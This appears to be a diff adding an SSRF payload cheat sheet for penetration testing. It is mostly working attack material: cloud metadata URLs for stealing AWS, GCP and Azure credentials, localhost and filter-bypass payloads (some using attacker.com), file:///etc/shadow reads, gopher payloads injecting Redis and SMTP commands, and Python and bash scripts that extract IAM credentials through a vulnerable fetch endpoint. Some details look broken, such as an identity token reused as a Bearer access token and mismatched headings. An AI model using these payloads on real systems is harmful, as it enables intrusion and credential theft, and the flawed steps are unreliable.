@@ -1,0 +1,224 @@
+# SSRF — Server-Side Request Forgery
+
+## AWS Metadata (v1 IMDSv1 — deprecated but often works)
+
+### Basic Metadata
+http://169.254.169.254/latest/meta-data/
+
+### Instance Identity Document
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]/
+
+### Access Keys Extraction
+```
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE_NAME]/
+{
+  "Code" : "Success",
+  "AccessKeyId" : "ASIXXXXXXXXXXXXXX",
+  "SecretAccessKey" : "XXXXXXXX...",
+  "Token" : "XXXXXXXX...",
+  "Expiration" : "2024-01-15T10:00:00Z"
+}
+```
+
+### User Data (startup scripts)
+http://169.254.169.254/latest/user-data
+
+### Instance Info
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/instance-type
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-ipv4
+
+## AWS Metadata (v2 IMDSv2 — requires token)
+
+### Get Token
+curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+
+### Use Token
+curl -H "X-aws-ec2-metadata-token: [TOKEN]" http://169.254.169.254/latest/meta-data/
+
+## GCP Metadata
+
+### Basic Access
+http://metadata.google.internal/computeMetadata/v1/
+Header: Metadata-Flavor: Google
+
+### Access Token
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://www.googleapis.com/
+Header: Metadata-Flavor: Google
+
+### Service Account Key
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/key
+Header: Metadata-Flavor: Google
+
+### Project ID
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+Header: Metadata-Flavor: Google
+
+## Azure Metadata
+
+### Token Endpoint
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2017-09-01&resource=https://management.azure.com/
+
+### Instance Metadata
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+Header: Metadata: true
+
+## Localhost Bypass
+
+### Standard Localhost
+http://localhost/admin
+http://127.0.0.1/admin
+http://0/admin (some systems)
+http://0.0.0.0/admin
+
+### Octal Notation
+http://0177.0.0.1/admin (127.0.0.1 in octal)
+
+### Hex Notation
+http://0x7f.0x0.0x0.0x1/admin (127.0.0.1 in hex)
+http://2130706433/admin (127.0.0.1 as integer)
+
+### IPv6
+http://[::1]/admin
+http://[::ffff:127.0.0.1]/admin
+
+### Domain Name Tricks
+http://localhost./admin
+http://127.0.0.1./admin
+http://127.0.0.1:80@attacker.com/admin (auth bypass)
+
+### DNS Rebinding
+attacker.com resolves to 127.0.0.1 on second lookup
+Payload: http://attacker.com/admin
+
+## Filtering Bypass Techniques
+
+### URL Encoding
+Standard: http://localhost/
+Bypass: http://%6c%6f%63%61%6c%68%6f%73%74/
+Bypass: http://127.0.0.1/ → http://127%2e0%2e0%2e1/
+
+### Double Encoding
+http://169.254.169.254/ → http://169%252e254%252e169%252e254/
+
+### Null Byte Injection (older systems)
+http://localhost%00attacker.com/
+
+### Protocol Switching
+http://localhost/ → https://localhost/
+gopher://localhost/
+dict://localhost/
+
+### Port Variation
+http://localhost:80/
+http://localhost:8080/
+http://localhost:3306/ (MySQL)
+http://localhost:5432/ (PostgreSQL)
+
+### Case Variation
+http://LOCALHOST/
+http://LoCalHost/
+
+### Fragment/Query Bypass
+http://attacker.com#http://localhost/
+http://localhost/?url=http://attacker.com
+
+## File Protocol SSRF
+
+### Read Local Files
+file:///etc/passwd
+file:///etc/shadow
+file:///c:/windows/win.ini
+
+### Java Deserialization
+Special case with specific Java libs
+Can lead to RCE via gadget chains
+
+## Gopher Protocol (older services)
+
+### Redis Access
+gopher://localhost:6379/_AUTH%20default%0D%0ASET%20key%20value%0D%0A
+
+### SMTP Injection
+gopher://localhost:25/_MAIL%20FROM:attacker@evil.com%0D%0A
+
+## Proof of Concept
+
+### Basic SSRF Test
+```python
+import requests
+
+target = "https://target.com/api/fetch?url="
+
+ssrf_payloads = [
+    "http://169.254.169.254/latest/meta-data/",
+    "http://localhost/admin",
+    "http://127.0.0.1/admin",
+    "http://[::1]/admin",
+    "http://0/admin",
+]
+
+for payload in ssrf_payloads:
+    try:
+        r = requests.get(target + payload, timeout=5, verify=False)
+        print(f"[Found] Payload: {payload}")
+        print(f"Status: {r.status_code}")
+        print(f"Response: {r.text[:200]}")
+        print("---")
+    except Exception as e:
+        print(f"[Error] {payload}: {e}")
+```
+
+### AWS Metadata Extraction
+```python
+import requests
+
+target = "https://target.com/api/fetch?url="
+
+# List available roles
+roles_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+r = requests.get(target + roles_url, timeout=5, verify=False)
+print("Available roles:", r.text)
+
+# Get credentials for each role
+role_name = r.text.split()[0]
+creds_url = f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
+r = requests.get(target + creds_url, timeout=5, verify=False)
+print("Credentials:", r.text)
+```
+
+### GCP Metadata Extraction (requires token)
+```bash
+# Step 1: Fetch token
+TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
+  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=https://www.googleapis.com/")
+
+# Step 2: Use token for API access
+curl -s -H "Authorization: Bearer $TOKEN" \
+  https://www.googleapis.com/compute/v1/projects/[PROJECT_ID]/zones/[ZONE]/instances
+```
+
+## CVSS Examples
+
+### SSRF to Metadata Read (AWS)
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+Score: 7.5 (High)
+- Direct credential theft
+- No auth required
+- Can access AWS APIs
+
+### SSRF to Internal Service RCE
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+Score: 9.8 (Critical)
+- Can compromise internal systems
+- Full code execution possible
+- Lateral movement vector
+
+### SSRF to Database (Read-Only)
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+Score: 7.5 (High)
+- Data confidentiality breach
+- No write access (yet)
